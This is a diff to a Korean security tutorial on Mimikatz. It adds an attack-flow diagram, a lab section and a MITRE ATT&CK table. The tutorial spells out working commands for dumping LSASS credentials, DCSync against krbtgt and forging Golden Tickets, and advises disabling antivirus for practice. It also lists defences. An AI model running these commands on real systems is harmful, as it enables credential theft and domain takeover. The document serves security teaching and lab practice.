@@ -15,7 +15,48 @@ description: "윈도우 시스템의 메모리에서 비밀번호와 해시를 �
 
 ---
 
-## 2. 주요 명령어
+## 2. 공격 흐름
+
+```mermaid
+flowchart TD
+    A[초기 침투] --> B[권한 상승]
+    B --> C[privilege::debug]
+    C --> D{목표?}
+    D -->|로컬| E[sekurlsa::logonpasswords]
+    D -->|도메인| F[lsadump::dcsync]
+    E --> G[Pass-the-Hash]
+    F --> H[Golden Ticket]
+    G --> I[내부망 확장]
+    H --> I
+```
+
+---
+
+## 3. 실습 환경
+
+### Windows VM
+```powershell
+# Windows 10/Server 2019 VM 구성
+# 로컬 관리자로 로그인 후 Mimikatz 실행
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+### Active Directory 랩
+```powershell
+# DC + 도메인 조인된 클라이언트 구성
+# DCSync, Golden Ticket 실습 가능
+# https://github.com/Orange-Cyberdefense/GOAD (Game of AD)
+```
+
+### 주의사항
+*   Windows Defender가 Mimikatz를 차단하므로 실습 시 AV 비활성화 필요
+*   VM 환경에서만 실습 권장 (실제 시스템 사용 금지)
+
+---
+
+## 4. 주요 명령어
 
 Mimikatz는 대화형 콘솔에서 명령어를 입력하는 방식으로 동작한다. 가장 먼저 디버그 권한을 획득해야 한다.
 
@@ -45,7 +86,7 @@ mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
 
 ---
 
-## 3. 공격 실습: Golden Ticket
+## 5. 공격 실습: Golden Ticket
 
 **Golden Ticket**은 도메인의 모든 서비스에 접근할 수 있는 만능 티켓(TGT)을 위조하는 공격이다. 이를 위해서는 `krbtgt` 계정의 해시가 필요하다.
 
@@ -63,7 +104,7 @@ mimikatz # kerberos::golden /user:fakeadmin /domain:target.local /sid:<Domain_SI
 
 ---
 
-## 4. 탐지 및 보안 대책
+## 6. 탐지 및 보안 대책
 
 Mimikatz 공격은 시스템에 치명적이므로 다층적인 방어 전략이 필요하다.
 
@@ -76,5 +117,18 @@ Mimikatz 공격은 시스템에 치명적이므로 다층적인 방어 전략이
 2.  **LSA 보호 모드 (LSA Protection)**: 서명되지 않은 프로세스가 LSASS에 접근하지 못하도록 설정한다.
 3.  **WDigest 비활성화**: 레지스트리 설정을 통해 비밀번호가 메모리에 평문으로 저장되지 않도록 한다.
 4.  **Tiered Administration**: 도메인 관리자 계정은 일반 워크스테이션에 로그인하지 않도록 관리 계층을 분리한다.
+
+---
+
+## MITRE ATT&CK 매핑
+
+| Mimikatz 기능 | ATT&CK 기법 | ID | 단계 |
+|---------------|------------|-----|------|
+| `sekurlsa::logonpasswords` | OS Credential Dumping: LSASS Memory | T1003.001 | Credential Access |
+| `sekurlsa::pth` | Use Alternate Authentication Material: Pass the Hash | T1550.002 | Lateral Movement |
+| `lsadump::dcsync` | OS Credential Dumping: DCSync | T1003.006 | Credential Access |
+| `kerberos::golden` | Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | Credential Access |
+| `kerberos::silver` | Steal or Forge Kerberos Tickets: Silver Ticket | T1558.002 | Credential Access |
+| `kerberos::ptt` | Use Alternate Authentication Material: Pass the Ticket | T1550.003 | Lateral Movement |
 
 <hr class="short-rule">
